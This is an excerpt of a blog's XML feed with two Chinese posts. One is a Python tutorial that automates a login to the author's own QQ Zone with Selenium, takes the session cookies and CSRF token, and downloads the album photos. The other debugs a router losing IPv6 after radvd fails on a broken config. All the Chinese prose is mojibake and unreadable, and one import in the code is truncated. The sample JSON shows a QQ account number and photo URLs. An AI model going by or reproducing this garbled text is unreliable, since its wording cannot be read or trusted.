         &quot;tag&quot; : &quot;&quot;,
         &quot;uploadtime&quot; : &quot;2014-06-13 20:21:33&quot;,
         &quot;url&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/b\/dIY29GUbJgAA&amp;bo=pANtAgAAAAABCeY!&quot;,
         &quot;width&quot; : 932,
         &quot;yurl&quot; : 0
      },
      // ...
   ]
   &quot;t&quot; : &quot;952444063&quot;,
   &quot;topic&quot; : {
      &quot;bitmap&quot; : &quot;10000000&quot;,
      &quot;browser&quot; : 0,
      &quot;classid&quot; : 106,
      &quot;comment&quot; : 1,
      &quot;cover_id&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,
      &quot;createtime&quot; : 1402661881,
      &quot;desc&quot; : &quot;&quot;,
      &quot;handset&quot; : 0,
      &quot;id&quot; : &quot;V13LmPKk0JLNRY&quot;,
      &quot;is_share_album&quot; : 0,
      &quot;lastuploadtime&quot; : 1402662103,
      &quot;modifytime&quot; : 1408271987,
      &quot;name&quot; : &quot;æ¯•ä¸šå­£&quot;,
      &quot;ownerName&quot; : &quot;707922098&quot;,
      &quot;ownerUin&quot; : &quot;707922098&quot;,
      &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/a\/dIY29GUbJgAA&quot;,
      &quot;priv&quot; : 1,
      &quot;pypriv&quot; : 1,
      &quot;share_album_owner&quot; : 0,
      &quot;total&quot; : 4,
      &quot;url&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/b\/dIY29GUbJgAA&quot;,
      &quot;viewtype&quot; : 0
   },
   &quot;totalInAlbum&quot; : 4,
   &quot;totalInPage&quot; : 4
}
</code></pre>
<p>è¿”å›çš„ç…§ç‰‡ä¿¡æ¯éƒ½å­˜äº<code>photoList</code>, ä¸Šé¢åŒæ ·åªæˆªå–äº†ä¸€å¼ ç…§ç‰‡çš„ä¿¡æ¯ï¼Œåé¢ä¸€éƒ¨åˆ†è¿”å›çš„æ˜¯å½“å‰ç›¸å†Œçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚<code>totalInAlbum</code>ï¼Œ <code>totalInPage</code>å­˜å‚¨äº†å½“å‰ç›¸å†Œæ€»å…±åŒ…å«çš„ç…§ç‰‡æ•°åŠæœ¬æ¬¡è¿”å›çš„ç…§ç‰‡æ•°ã€‚è€Œæˆ‘ä»¬éœ€è¦ä¸‹è½½çš„å›¾ç‰‡é“¾æ¥åˆ™æ˜¯<code>url</code>ï¼</p>
<p>OK, åˆ°æ­¤ï¼Œæ‰€æœ‰è¯·æ±‚å’Œå“åº”æ•°æ®éƒ½åˆ†ææ¸…æ¥šäº†ï¼Œæ¥ä¸‹æ¥ä¾¿æ˜¯<code>coding</code>çš„æ—¶å€™äº†ã€‚</p>
<h2 id="ç¡®å®šçˆ¬å–æ–¹æ¡ˆ"><a href="#ç¡®å®šçˆ¬å–æ–¹æ¡ˆ" class="headerlink" title="ç¡®å®šçˆ¬å–æ–¹æ¡ˆ"></a>ç¡®å®šçˆ¬å–æ–¹æ¡ˆ</h2><ol>
<li>åˆ›å»º<code>qqzone</code>ç±»ï¼Œåˆå§‹åŒ–ç”¨æˆ·ä¿¡æ¯</li>
<li>ä½¿ç”¨<code>Selenium</code>æ¨¡æ‹Ÿç™»å½•</li>
<li>è·å–<code>Cookies</code>å’Œ<code>g_tk</code></li>
<li>ä½¿ç”¨<code>requests</code>è·å–ç›¸å†Œåˆ—è¡¨ä¿¡æ¯</li>
<li>éå†ç›¸å†Œï¼Œè·å–ç…§ç‰‡åˆ—è¡¨ä¿¡æ¯å¹¶ä¸‹è½½ç…§ç‰‡</li>
</ol>
<h3 id="åˆ›å»ºqqzoneç±»"><a href="#åˆ›å»ºqqzoneç±»" class="headerlink" title="åˆ›å»ºqqzoneç±»"></a>åˆ›å»ºqqzoneç±»</h3><pre><code class="python">class qqzone(object):
    &quot;&quot;&quot;QQç©ºé—´ç›¸å†Œçˆ¬è™«&quot;&quot;&quot;
    def __init__(self, user):
        self.username = user[&#39;username&#39;]
        self.password = user[&#39;password&#39;]
</code></pre>
<h3 id="æ¨¡æ‹Ÿç™»å½•"><a href="#æ¨¡æ‹Ÿç™»å½•" class="headerlink" title="æ¨¡æ‹Ÿç™»å½•"></a>æ¨¡æ‹Ÿç™»å½•</h3><pre><code class="python">from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import WebDriverExceptio

# ...

def _login_and_get_args(self):
    &quot;&quot;&quot;ç™»å½•QQï¼Œè·å–Cookieså’Œg_tk&quot;&quot;&quot;
    opt = webdriver.ChromeOptions()
    opt.set_headless()

    driver = webdriver.Chrome(chrome_options=opt)
    driver.get(&#39;https://i.qq.com/&#39;)
    # time.sleep(2)

    logging.info(&#39;User {} login...&#39;.format(self.username))
    driver.switch_to.frame(&#39;login_frame&#39;)
    driver.find_element_by_id(&#39;switcher_plogin&#39;).click()
    driver.find_element_by_id(&#39;u&#39;).clear()
    driver.find_element_by_id(&#39;u&#39;).send_keys(self.username)
    driver.find_element_by_id(&#39;p&#39;).clear()
    driver.find_element_by_id(&#39;p&#39;).send_keys(self.password)
    driver.find_element_by_id(&#39;login_button&#39;).click()

    time.sleep(1)
    driver.get(&#39;https://user.qzone.qq.com/{}&#39;.format(self.username))
</code></pre>
<p>æ­¤å¤„éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<ol>
<li>ä½¿ç”¨<code>selenium</code>éœ€è¦å®‰è£…å¯¹åº”çš„<code>webdriver</code></li>
<li>å¯ä»¥é€šè¿‡<code>webdriver.Chrome()</code>æŒ‡å®šæµè§ˆå™¨ä½ç½®ï¼Œå¦åˆ™é»˜è®¤ä»ç¯å¢ƒå˜é‡å®šä¹‰çš„è·¯å¾„æŸ¥æ‰¾</li>
<li>å¦‚æœç”µè„‘æ‰“å¼€æµè§ˆå™¨è¾ƒæ…¢ï¼Œå¯èƒ½éœ€è¦åœ¨<code>driver.get</code>å<code>sleep</code>å‡ ç§’</li>
</ol>
<h3 id="è·å–-Cookies"><a href="#è·å–-Cookies" class="headerlink" title="è·å– Cookies"></a>è·å– Cookies</h3><p>ä½¿ç”¨<code>selenium</code>è·å–<code>Cookies</code>éå¸¸æ–¹ä¾¿</p>
<pre><code class="python">self.cookies = driver.get_cookies()
</code></pre>
<h3 id="è·å–-g-tk"><a href="#è·å–-g-tk" class="headerlink" title="è·å– g_tk"></a>è·å– g_tk</h3><p>è·å–<code>g_tk</code>æœ€å¼€å§‹å¯ä»¥è¯´æ˜¯æœ¬çˆ¬è™«æœ€å¤§çš„éš¾ç‚¹ï¼Œå› ä¸ºä»ç½‘é¡µä¸­æ ¹æœ¬æ‰¾ä¸åˆ°ç›´æ¥å†™æ˜çš„æ•°å€¼ï¼Œåªæœ‰å„ç§å‡½æ•°è°ƒç”¨ã€‚ä¸ºæ­¤æˆ‘å…¨å±€æœç´¢ï¼Œå‘ç°å¥½å¤šåœ°æ–¹éƒ½æœ‰å…¶è·å–æ–¹å¼ã€‚</p>
<p><img src="/assets/qqzone/g_tk.png" alt="g_tk"></p>
<p>æœ€åé€‰æ‹©äº†å…¶ä¸­ä¸€å¤„ï¼Œé€šè¿‡<code>selenium</code>æ‰§è¡Œè„šæœ¬çš„åŠŸèƒ½æˆåŠŸè·å–åˆ°äº†<code>g_tk</code>ï¼</p>
<pre><code class="python">self.g_tk = driver.execute_script(&#39;return QZONE.FP.getACSRFToken()&#39;)
</code></pre>
<p>åˆ°æ­¤ï¼Œ<code>selenium</code>çš„ä½¿å‘½å°±å®Œæˆäº†ï¼Œå‰©ä¸‹çš„å°†é€šè¿‡<code>requests</code>æ¥å®Œæˆã€‚</p>
<h3 id="åˆå§‹åŒ–-request-Session"><a href="#åˆå§‹åŒ–-request-Session" class="headerlink" title="åˆå§‹åŒ– request.Session"></a>åˆå§‹åŒ– request.Session</h3><p>æ¥ä¸‹æ¥éœ€è¦é€æ­¥ç”Ÿæˆè¯·æ±‚ç„¶åè·å–æ•°æ®ã€‚ä½†æ˜¯ä¸ºæ–¹ä¾¿èµ·è§ï¼Œè¿™é‡Œä½¿ç”¨ä¼šè¯çš„æ–¹å¼è¯·æ±‚æ•°æ®ï¼Œé…ç½®å¥½<code>cookie</code>å’Œ<code>headers</code>ï¼Œçœçš„æ¯æ¬¡è¯·æ±‚éƒ½è®¾ç½®ä¸€éã€‚</p>
<pre><code class="python">def _init_session(self):
    self.session = requests.Session()
    for cookie in self.cookies:
        self.session.cookies.set(cookie[&#39;name&#39;], cookie[&#39;value&#39;])
    self.session.headers = {
        &#39;Referer&#39;: &#39;https://qzs.qq.com/qzone/photo/v7/page/photo.html?init=photo.v7/module/albumList/index&amp;navBar=1&#39;,
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36&#39;
    }
</code></pre>
<h3 id="è¯·æ±‚ç›¸å†Œä¿¡æ¯"><a href="#è¯·æ±‚ç›¸å†Œä¿¡æ¯" class="headerlink" title="è¯·æ±‚ç›¸å†Œä¿¡æ¯"></a>è¯·æ±‚ç›¸å†Œä¿¡æ¯</h3><p>è·å–ç›¸å†Œä¿¡æ¯ï¼Œéœ€è¦å…ˆå°è£…å¥½è¯·æ±‚å‚æ•°ï¼Œç„¶åé€šè¿‡<code>session.get</code>çˆ¬å–æ•°æ®ï¼Œå†é€šè¿‡æ­£åˆ™åŒ¹é…ä»¥<code>json</code>æ ¼å¼è¯»å–<code>jsonp</code>æ•°æ®ï¼Œæœ€åè§£ææ‰€éœ€çš„<code>name</code>å’Œ<code>id</code>ã€‚</p>
<pre><code class="python">def _get_ablum_list(self):
    &quot;&quot;&quot;è·å–ç›¸å†Œçš„åˆ—è¡¨ä¿¡æ¯&quot;&quot;&quot;
    album_url = &#39;{}{}&#39;.format(
        &#39;https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/fcg_list_album_v3?&#39;,
        self._get_query_for_request())

    logging.info(&#39;Getting ablum list id...&#39;)
    resp = self.session.get(album_url)
    data = self._load_callback_data(resp)

    album_list = {}
    for item in data[&#39;data&#39;][&#39;albumListModeSort&#39;]:
        album_list[item[&#39;name&#39;]] = item[&#39;id&#39;]

    return album_list
</code></pre>
<p>å…¶ä¸­çš„å‚æ•°ç»„åˆæ¥è‡ªä¸‹é¢çš„å‡½æ•°<code>_get_query_for_request</code>å‡½æ•°ã€‚</p>
<pre><code class="python">def _get_query_for_request(self, topicId=None, pageStart=0, pageNum=100):
    &quot;&quot;&quot;è·å–è¯·æ±‚ç›¸å†Œä¿¡æ¯æˆ–ç…§ç‰‡ä¿¡æ¯æ‰€éœ€çš„å‚æ•°

    Args:
        topicId: æ¯ä¸ªç›¸å†Œå¯¹åº”çš„å”¯ä¸€æ ‡è¯†ç¬¦
        pageStart: è¯·æ±‚æŸä¸ªç›¸å†Œçš„ç…§ç‰‡åˆ—è¡¨ä¿¡æ¯æ‰€éœ€çš„èµ·å§‹é¡µç 
        pageNum: å•æ¬¡è¯·æ±‚æŸä¸ªç›¸å†Œçš„ç…§ç‰‡æ•°é‡

    Returns:
        ä¸€ä¸ªç»„åˆå¥½æ‰€æœ‰è¯·æ±‚å‚æ•°çš„å­—ç¬¦ä¸²
    &quot;&quot;&quot;
    query = {
        &#39;g_tk&#39;: self.g_tk,
        &#39;hostUin&#39;: self.username,
        &#39;uin&#39;: self.username,
        &#39;appid&#39;: 4,
        &#39;inCharset&#39;: &#39;utf-8&#39;,
        &#39;outCharset&#39;: &#39;utf-8&#39;,
        &#39;source&#39;: &#39;qzone&#39;,
        &#39;plat&#39;: &#39;qzone&#39;,
        &#39;format&#39;: &#39;jsonp&#39;
    }
    if topicId:
        query[&#39;topicId&#39;] = topicId
        query[&#39;pageStart&#39;] = pageStart
        query[&#39;pageNum&#39;] = pageNum
    return &#39;&amp;&#39;.join(&#39;{}={}&#39;.format(key, val) for key, val in query.items())
</code></pre>
<p>å…¶ä¸­çš„<code>jsonp</code>è§£æå‡½æ•°å¦‚ä¸‹ï¼Œä¸»ä½“éƒ¨åˆ†å°±æ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œéå¸¸ç®€å•ã€‚</p>
<pre><code class="Python">def _load_callback_data(self, resp):
    &quot;&quot;&quot;ä»¥jsonæ ¼å¼è§£æè¿”å›çš„jsonpæ•°æ®&quot;&quot;&quot;
    try:
        resp.encoding = &#39;utf-8&#39;
        data = loads(re.search(r&#39;.*?\(({.*}).*?\).*&#39;, resp.text, re.S)[1])
        return data
    except ValueError:
        logging.error(&#39;Invalid input&#39;)
</code></pre>
<h3 id="è§£æå¹¶ä¸‹è½½ç…§ç‰‡"><a href="#è§£æå¹¶ä¸‹è½½ç…§ç‰‡" class="headerlink" title="è§£æå¹¶ä¸‹è½½ç…§ç‰‡"></a>è§£æå¹¶ä¸‹è½½ç…§ç‰‡</h3><p>è·å–ç›¸å†Œåˆ—è¡¨åï¼Œé€ä¸ªè¯·æ±‚ç…§ç‰‡åˆ—è¡¨ä¿¡æ¯ï¼Œè¿›è€Œé€ä¸€ä¸‹è½½</p>
<pre><code class="python">def _get_photo(self, album_name, album_id):
    &quot;&quot;&quot;è·å–å•ä¸ªç›¸å†Œçš„ç…§ç‰‡åˆ—è¡¨ä¿¡æ¯ï¼Œå¹¶ä¸‹è½½è¯¥ç›¸å†Œæ‰€æœ‰ç…§ç‰‡&quot;&quot;&quot;
    photo_list_url = &#39;{}{}&#39;.format(
        &#39;https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/cgi_list_photo?&#39;,
        self._get_query_for_request(topicId=album_id))

    logging.info(&#39;Getting photo list for album {}...&#39;.format(album_name))
    resp = self.session.get(photo_list_url)
    data = self._load_callback_data(resp)
    if data[&#39;data&#39;][&#39;totalInPage&#39;] == 0:
        return None

    file_dir = self.get_path(album_name)
    for item in data[&#39;data&#39;][&#39;photoList&#39;]:
        path = &#39;{}/{}.jpg&#39;.format(file_dir, item[&#39;name&#39;])
        logging.info(&#39;Downloading {}-{}&#39;.format(album_name, item[&#39;name&#39;]))
        self._download_image(item[&#39;url&#39;], path)
</code></pre>
<p>ä¸‹è½½å›¾ç‰‡ä¹Ÿæ˜¯é€šè¿‡<code>request</code>,è®°å¾—è®¾ç½®è¶…æ—¶æ—¶é—´ã€‚</p>
<pre><code class="python">def _download_image(self, url, path):
    &quot;&quot;&quot;ä¸‹è½½å•å¼ ç…§ç‰‡&quot;&quot;&quot;
    try:
        resp = self.session.get(url, timeout=15)
        if resp.status_code == 200:
            open(path, &#39;wb&#39;).write(resp.content)
    except requests.exceptions.Timeout:
        logging.warning(&#39;get {} timeout&#39;.format(url))
    except requests.exceptions.ConnectionError as e:
        logging.error(e.__str__)
    finally:
        pass
</code></pre>
<h2 id="çˆ¬å–æµ‹è¯•"><a href="#çˆ¬å–æµ‹è¯•" class="headerlink" title="çˆ¬å–æµ‹è¯•"></a>çˆ¬å–æµ‹è¯•</h2><ul>
<li>çˆ¬å–è¿‡ç¨‹</li>
</ul>
<p><img src="/assets/qqzone/downloading.png" alt="capturing"></p>
<ul>
<li>çˆ¬å–ç»“æœ</li>
</ul>
<p><img src="/assets/qqzone/downloaded_photos.png" alt="downloaded photos"></p>
<h2 id="å†™åœ¨æœ€å"><a href="#å†™åœ¨æœ€å" class="headerlink" title="å†™åœ¨æœ€å"></a>å†™åœ¨æœ€å</h2><ol>
<li>å¦‚æœå°†è¯·æ±‚å‚æ•°ä¸­çš„<code>format</code>ç”±<code>jsonp</code>æ”¹æˆ<code>json</code>ï¼Œåˆ™å¯ä»¥ç›´æ¥è·å–<code>json</code>æ•°æ®</li>
<li>æœ¬ç”¨ä¾‹å¹¶æœªä½¿ç”¨å¤šè¿›ç¨‹æˆ–å¤šçº¿ç¨‹ï¼Œæ‰€ä»¥é€Ÿç‡ä¸ç®—å¿«ï¼Œè¿˜æœ‰å¾…ä¼˜åŒ–çš„åœ°æ–¹</li>
<li>è¯¥çˆ¬è™«å·²å­˜æ”¾è‡³å¼€æºé¡¹ç›®<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">Github capturer</a>ï¼Œæ¬¢è¿äº¤æµ</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> qqzone </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[è®°ä¸€æ¬¡Clientæ— æ³•è·å–IPv6åœ°å€é—®é¢˜çš„åˆ†æè¿‡ç¨‹]]></title>
      <url>https://www.litreily.top/2019/02/27/ipv6/</url>
      <content type="html"><![CDATA[<p>è¿‘æ—¥SQAæŠ¥äº†ä¸€ä¸ªbugï¼Œå¯¹è·¯ç”±å™¨ç»è¿‡6å¤©å·¦å³çš„å‹åŠ›æµ‹è¯•åï¼Œæ— è®ºæ˜¯æœ‰çº¿è®¾å¤‡è¿˜æ˜¯æ— çº¿è®¾å¤‡éƒ½æ‹¿ä¸åˆ°<code>IPv6</code>åœ°å€äº†ã€‚ç»è¿‡å±‚å±‚åˆ†æå‘ç°å¯èƒ½æ˜¯<code>kernel</code>å†…å­˜æ³„æ¼ã€‚æœ¬æ–‡ä¾¿è®°å½•è¿™ä¸€é—®é¢˜çš„åˆ†æè¿‡ç¨‹ã€‚</p>
<a id="more"></a>
<h2 id="æ£€æŸ¥ç½‘ç»œçŠ¶æ€"><a href="#æ£€æŸ¥ç½‘ç»œçŠ¶æ€" class="headerlink" title="æ£€æŸ¥ç½‘ç»œçŠ¶æ€"></a>æ£€æŸ¥ç½‘ç»œçŠ¶æ€</h2><p>é¦–å…ˆæ‰“å¼€Routerçš„consoleï¼Œä½¿ç”¨<code>ifconfig br0</code>(br0æ˜¯Router LANç«¯çš„æ¡¥æ¥åœ°å€)æŸ¥çœ‹å½“å‰çš„ç½‘ç»œçŠ¶æ€</p>
<pre><code class="sh">$ ifconfig br0
br0       Link encap:Ethernet  HWaddr A0:63:91:A7:63:07  
          inet addr:192.168.27.1  Bcast:192.168.27.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:530995052 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1012058984 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:108097854210 (100.6 GiB)  TX bytes:1331062907089 (1.2 TiB)
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒRouterè‡ªèº«ä¹Ÿåªæœ‰<code>IPv4</code>åœ°å€ï¼Œæ²¡æœ‰<code>IPv6</code>åœ°å€ï¼Œæ‰€ä»¥é—®é¢˜å‡ºåœ¨Routerè‡ªèº«ï¼Œä¸å¯èƒ½æ˜¯Clienté…ç½®é”™è¯¯ï¼Œé‚£ä¸ºä»€ä¹ˆRouterè‡ªå·±éƒ½æ²¡æœ‰æ‹¿åˆ°<code>IPv6</code>å‘¢ï¼Ÿä¸‹é¢æ¥åˆ†æå‹åŠ›æµ‹è¯•è¿‡ç¨‹ä¿å­˜çš„console log.</p>
<h2 id="åˆ†æconsole-log"><a href="#åˆ†æconsole-log" class="headerlink" title="åˆ†æconsole log"></a>åˆ†æconsole log</h2><p>åœ¨å‹åŠ›æµ‹è¯•çš„å‰å‡ å¤©ï¼Œä»ä»¥ä¸‹logå¯çŸ¥Routeræ˜¯æœ‰<code>IPv6</code>çš„ï¼ŒRouterè²Œä¼¼æ­£å¸¸è¿è¡Œå‡ å¤©åå°±å¤±å»äº†<code>Ipv6</code></p>
<pre><code class="sh">br0       Link encap:Ethernet  HWaddr A0:63:91:A7:63:07  
          inet addr:192.168.27.1  Bcast:192.168.27.255  Mask:255.255.255.0
          inet6 addr: 2002:76a7:859d:0:44f3:adff:fef9:f52/64 Scope:Global
          inet6 addr: fe80::a263:91ff:fea7:6307/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1184678 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1476645 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1200677624 (1.1 GiB)  TX bytes:1867999218 (1.7 GiB)
</code></pre>
<p>å…¶ä¸­çš„<code>IPv6</code>åœ°å€å¦‚ä¸‹ï¼š</p>
<pre><code class="sh">inet6 addr: 2002:76a7:859d:0:44f3:adff:fef9:f52/64 Scope:Global
inet6 addr: fe80::a263:91ff:fea7:6307/64 Scope:Link
</code></pre>
<p>ç¬¬ä¸€ä¸ª<code>IPv6</code>æ˜¯ç”¨æ¥ä¸å¤–éƒ¨äº’è”ç½‘é€šä¿¡çš„åœ°å€ï¼Œç¬¬äºŒä¸ªä»¥<code>fe80::</code>å¼€å¤´çš„ç§°ä¸ºé“¾è·¯æœ¬åœ°åœ°å€(Link-local address)ï¼Œä¸<code>IPv4</code>ä¸­çš„<code>169.254.0.0/16</code>åœ°å€ç±»ä¼¼ï¼Œæ­¤ç±»åœ°å€ä¸éœ€è¦ä¸å¤–éƒ¨ç½‘ç»œé€šä¿¡ï¼Œé€šå¸¸ç”¨äºæœ¬åœ°ä¸»æœºé—´çš„ç›¸äº’é€šè®¯ã€‚</p>
<h2 id="IPv6ç›¸å…³è¿›ç¨‹åˆ†æ"><a href="#IPv6ç›¸å…³è¿›ç¨‹åˆ†æ" class="headerlink" title="IPv6ç›¸å…³è¿›ç¨‹åˆ†æ"></a>IPv6ç›¸å…³è¿›ç¨‹åˆ†æ</h2><p>å¥½äº†ï¼Œç°åœ¨çš„é—®é¢˜æ˜¯ä»€ä¹ˆå¯¼è‡´<code>IPv6</code>å¿½ç„¶ä¸è§äº†ï¼Œæˆ‘æœ€åˆæƒ³æ³•æ˜¯Routerçš„<code>dhcpv6</code>æœåŠ¡å™¨æŒ‚äº†ï¼Œä½†æ˜¯<code>ps |grep dhcp</code>åå‘ç°æ˜¯æ­£å¸¸çš„ã€‚</p>
<pre><code class="sh">$ ps |grep dhcp
 2951 root        368 S   udhcpd /tmp/udhcpd.conf
28323 root        352 S   /usr/sbin/dhcp6s -3 -c /tmp/dhcp6s.conf br0
</code></pre>
<p>æ­¤å¤„è¯´æ˜ä¸€ç‚¹ï¼Œç”±äºWANç«¯ä½¿ç”¨çš„<code>PPPoE</code>æ‹¨å·ä¸Šç½‘æ–¹å¼ï¼Œæ‰€ä»¥æ²¡æœ‰å¯åŠ¨<code>dhcp6c</code>ï¼ˆç”¨äºè·å–ipv6çš„å®¢æˆ·ç«¯ç¨‹åºï¼‰ã€‚é‚£æ˜¯ä¸æ˜¯è¿˜æœ‰å…¶å®ƒç›¸å…³çš„è¿›ç¨‹æŒ‚äº†å‘¢ï¼Ÿä¸ºæ­¤æˆ‘é—®äº†ä¸‹ç»„é•¿ï¼ˆå¤§ç‰›ï¼‰ï¼Œå‘ç°ç¡®å®è¿˜æœ‰ä¸ª<code>radvd</code>è¿›ç¨‹ï¼å¯¹æ¯”å‰å<code>log</code>ä¸­çš„<code>ps</code>è¾“å‡ºå‘ç°ç¡®å®æ˜¯è¿™ä¸ªè¿›ç¨‹æŒ‚äº†ï¼ï¼ï¼</p>
<blockquote>
<p><strong>è·¯ç”±å¹¿æ’­å®ˆæŠ¤</strong>ï¼ˆThe Router Advertisement Daemonï¼Œç®€ç§°ï¼š<code>radvd</code>ï¼‰æ˜¯ä¸€ä¸ªç¬¦åˆ<code>RFC 2461</code>ä½¿ç”¨é‚»å±…å‘ç°åè®®ç”¨äºå®ç°<code>IPv6</code>åœ°å€æœ¬åœ°é“¾æ¥å¹¿æ’­å’Œ<code>IPv6</code>è·¯ç”±å‰ç¼€çš„å¼€æºè½¯ä»¶ã€‚è¯¥è½¯ä»¶æ˜¯ç»™ç³»ç»Ÿç®¡ç†å‘˜ç”¨äºå®ç°åœ¨<code>IPv6</code>ä¸‹å¯¹ä¸»æœºè¿›è¡Œæ— çŠ¶æ€è‡ªåŠ¨é…ç½®åœ°å€ã€‚<br>--- <a href="https://zh.wikipedia.org/wiki/Radvd" target="_blank" rel="noopener">ç»´åŸºç™¾ç§‘</a></p>
</blockquote>
<p>æ€»ä¹‹ï¼Œ<code>radvd</code>ä¹Ÿæ˜¯<code>IPv6</code>å¿…ä¸å¯å°‘çš„è¿›ç¨‹ï¼Œè€Œä¸”è«åå…¶å¦™çš„æŒ‚äº†ã€‚</p>
<h2 id="radvdè¿›ç¨‹é€€å‡ºåŸå› åˆ†æ"><a href="#radvdè¿›ç¨‹é€€å‡ºåŸå› åˆ†æ" class="headerlink" title="radvdè¿›ç¨‹é€€å‡ºåŸå› åˆ†æ"></a>radvdè¿›ç¨‹é€€å‡ºåŸå› åˆ†æ</h2><p>ä¸ºäº†åˆ†æ<code>radvd</code>è¿›ç¨‹é€€å‡ºåŸå› ï¼Œæˆ‘å°è¯•æ‰‹åŠ¨é‡å¯è¿›ç¨‹</p>
<pre><code class="sh">$ /usr/sbin/radvd -C /tmp/radvd.conf
[Feb 26 06:29:51] radvd: syntax error in /tmp/radvd.conf, line 19: {
[Feb 26 06:29:51] radvd: error parsing or activating the config file: /tmp/radvd.conf
</code></pre>
<p>æç¤ºé…ç½®æ–‡ä»¶ç¬¬19è¯­æ³•é”™è¯¯ï¼Œé‚£æ¥çœ‹ä¸€ä¸‹<code>/tmp/radvd.conf</code></p>
<pre><code class="sh">$ cat /tmp/radvd.conf
interface br0 {
        AdvSendAdvert on;
        AdvCurHopLimit 64;
        MinRtrAdvInterval 198;
        MaxRtrAdvInterval 600;
        AdvOtherConfigFlag on;
        AdvDefaultLifetime 1800;
        AdvReachableTime 0;
        AdvRetransTimer 0;
        AdvDefaultPreference low;
        AdvHomeAgentFlag off;
        AdvManagedFlag off;
        prefix 2002:24e0:69cf:0::/64 {
                AdvOnLink on;
                AdvAutonomous on;
                AdvValidLifetime 2400;
                AdvPreferredLifetime 1800;
        };
        RDNSS  {
                AdvRDNSSPreference 8;
                AdvRDNSSLifetime 1200;
        };
};
</code></pre>
<p>ç¬¬19è¡Œ<code>RDNSS  {</code>ä¸æ­£å¸¸æƒ…å†µ<code>RDNSS  fe80::a263:91ff:fea7:6307 {</code>ç›¸æ¯”å°‘äº†é“¾è·¯æœ¬åœ°åœ°å€ï¼Œä¹Ÿå°±æ˜¯<code>fe80::</code>å¼€å¤´çš„åœ°å€ã€‚é‚£ä¹ˆè¿™ä¸ªé—®é¢˜æ˜¯æ€ä¹ˆäº§ç”Ÿçš„å‘¢ï¼Ÿä¸ºä»€ä¹ˆä¼šå°‘å‚æ•°å‘¢ï¼Ÿè¿™å°±éœ€è¦æ¥çœ‹å…·ä½“çš„ä»£ç äº†ã€‚</p>
<h2 id="net6confè„šæœ¬åˆ†æ"><a href="#net6confè„šæœ¬åˆ†æ" class="headerlink" title="net6confè„šæœ¬åˆ†æ"></a>net6confè„šæœ¬åˆ†æ</h2><p>åˆ†æGUIç›¸å…³ä»£ç åå‘ç°ï¼Œåœ¨ç‚¹å‡»Routerçš„<code>IPv6</code>é…ç½®é¡µé¢çš„<code>Apply</code>æŒ‰é’®åï¼Œåå°ä¼šæ‰§è¡Œ<code>net6conf restart</code>ï¼Œé‚£ä¹ˆå°±éœ€è¦åˆ†æ<code>net6conf</code>ä»£ç </p>
<pre><code class="sh">$ grep -rn fe80:: net6conf
net6conf:97:    $IP -6 addr add fe80::$eui64/64 dev $bridge
net6conf:103:   $IP -6 addr add fe80::$ipv6_interface_id/64 dev $bridge
</code></pre>
<p>ä½¿ç”¨<code>grep</code>åˆæ­¥å®šä½åˆ°é“¾è·¯æœ¬åœ°åœ°å€çš„ç”Ÿæˆå¤„ï¼Œç”±äº<code>net6conf</code>æ˜¯ä¸ª<code>shell</code>è„šæœ¬ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ä»£ç é™„è¿‘æ·»åŠ ä¸€è¡Œ<code>set -x</code>ï¼Œç„¶åæ‰‹åŠ¨æ‰§è¡Œ<code>net6conf restart</code>ï¼Œé‚£ä¹ˆä»£ç æ‰§è¡Œè¿‡ç¨‹å°±ä¼šå¾ˆè¯¦ç»†çš„æ‰“å°å‡ºæ¥ï¼Œæ¥ç€æ‰¾åˆ°ç”Ÿæˆé“¾è·¯æœ¬åœ°åœ°å€çš„é‚£ä¸€éƒ¨åˆ†</p>
<pre><code class="sh">+ /usr/sbin/ip -6 addr add fe80::a263:91ff:fea7:6307/64 dev br0
RTNETLINK answers: Cannot allocate memory
</code></pre>
<p>OKï¼Œæ€»ç®—æ‰¾åˆ°é—®é¢˜çš„å…³é”®æ‰€åœ¨äº†ï¼Œç¨‹åºåœ¨æ·»åŠ åœ°å€æ—¶å‡ºç°äº†æ— æ³•å†…å­˜åˆ†é…çš„é”™è¯¯ã€‚</p>
